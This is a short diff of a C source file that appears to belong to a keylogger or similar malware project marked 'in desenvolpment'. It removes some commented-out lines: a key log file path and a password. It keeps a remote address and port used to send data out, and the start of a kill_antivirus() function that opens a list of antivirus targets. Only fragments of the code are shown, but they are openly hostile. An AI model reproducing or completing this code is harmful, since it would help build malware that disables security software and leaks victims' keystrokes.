@@ -28,13 +28,9 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <sys/socket.h>
 #include <X11/Xlib.h>
 
-//#define FILENAME "/home/mrx6s0/key.log"
-
 #define remote_addr "127.0.0.1"
 
 #define remote_port 55766
-
-//#define pass "mrx6s0"
 
 /* struct of cong=figurations to target. */
 
@@ -67,7 +63,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 void kill_antivirus()
 
   {
-     //int i;
+   
      FILE *arq;
 
     arq = fopen("av.txt", "rb");
